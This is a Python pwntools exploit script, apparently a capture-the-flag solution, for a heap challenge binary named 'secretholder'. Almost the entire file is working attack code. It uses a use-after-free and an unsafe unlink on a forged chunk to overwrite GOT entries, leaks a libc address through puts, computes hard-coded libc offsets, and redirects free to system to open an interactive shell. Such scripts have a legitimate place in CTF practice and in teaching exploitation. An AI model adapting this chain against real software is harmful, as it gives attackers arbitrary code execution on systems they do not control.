from pwn import *


def small_malloc(p, data):
    p.send("1\n")
    p.send("1\n")
    p.send(data)

def big_malloc(p, data):
    p.send("1\n")
    p.send("2\n")
    p.send(data)

def huge_malloc(p, data):
    p.send("1\n")
    p.send("3\n")
    p.send(data)
    return p.recv()

def small_free(p):
    p.send("2")
    p.send("1")
    #return p.recv()

def big_free(p):
    p.send("2\n")
    p.send("2\n")
    #return p.recv()

def huge_free(p):
    p.send("2\n")
    p.send("3\n")
    #return p.recv()

SMALL_SIZE = 0x28
BIG_SIZE = 0xFA0
HUGE_SIZE= 0x61a80

p = process("./secretholder")
p.recv()

#malloc small
p.sendline("1")
p.recv()
p.sendline("1")
p.recv()
p.sendline("AAAAAAAA")
p.recv()

# free small, sets global ptr
p.sendline("2")
p.recv()
p.sendline("1")
p.recv()

# malloc big, sets global ptr and big_inuse
p.sendline("1")
p.recv()
p.sendline("2")
p.recv()
p.sendline("BBBBBBBB")
p.recv()

# free small, since ptr is not null
# preserves big_inuse
p.sendline("2")
p.recv()
p.sendline("1")
p.recv()

# malloc small, puts top chunk at offset into big
p.sendline("1")
p.recv()
p.sendline("1")
p.recv()
p.sendline("CCCCCCCC")
p.recv()

# top chunk is now at an offset into big,
# the global ptr to big chunk is valid and big_inuse is true

# huge malloc, mmaped since bigger than max size for main arena 
p.sendline("1")
p.recv()
p.sendline("3")
p.recv()
p.sendline("")
p.recv()

# free huge 
p.sendline("2")
p.recv()
p.sendline("3")
p.recv()

# huge malloc, this time it will be on the heap, idk why
p.sendline("1")
p.recv()
p.sendline("3")
p.recv()
p.sendline("")
p.recv()

# we can now use big to edit the header for huge, since
# big is still valid and big_inuse is still set.

# for reference: 
# https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c
# renew big, do modern unsafe unlink to point tiny at the location of the globals
p.sendline("3")
p.recv()
p.sendline("2")
p.recv()

fd_ptr = "\x98\x20\x60\x00\x00\x00\x00\x00"
bk_ptr = "\xa0\x20\x60\x00\x00\x00\x00\x00"  

fake_chunk = "\x00"*8 + p64(0x0) + fd_ptr + bk_ptr
prev_size = p64(0x20)

huge_size = "\x90\x1a\x06\x00\x00\x00\x00\x00"

p.sendline(fake_chunk + prev_size + huge_size)
p.recv()

# free huge, trigger unlink
p.sendline("2")
p.recv()
p.sendline("3")
p.recv()

# renew tiny, overwriting pbig to point to the got and huge to point to a libc leak (setvbuf)
p.sendline("3")
p.recv()
p.sendline("1")
p.recv()

overflow = "A"*8 + p64(0x602018) + p64(0x602068)
p.sendline(overflow)
p.recv()

# renew big, overwriting the ptr to free in the got to point to puts
p.sendline("3")
p.recv()
p.sendline("2")
p.recv()
p.send(p64(0x400c2e))
p.recv()

# free huge, which instead will call puts and print the addr of setvbuf
p.sendline("2")
p.recv()
p.sendline("3")
data = p.recv()[:-1] + "\x00\x00"

setvbuf_addr = u64(data)
print "LEAK:", setvbuf_addr
print "LEAK:", p64(setvbuf_addr).encode("hex")

libc_base = setvbuf_addr - 458352

sh_str = libc_base + 1622391

system_addr = libc_base + 283536

p.sendline("")
p.recv()

# renew tiny to have the str /bin/sh at a known location
p.sendline("3")
p.recv()
p.sendline("1")
p.recv()
p.send("/bin/bash\x00")
p.recv()


# renew big, overwriting the ptr to free in the got to point to system
p.sendline("3")
p.recv()
p.sendline("2")
p.recv()
p.send(p64(system_addr))
p.recv()

# free tiny, calling system with a ptr to tiny's contents, which is the string "/bin/sh"
p.sendline("")
p.recv()
p.sendline("2")
p.recv()
p.sendline("1")

p.interactive()
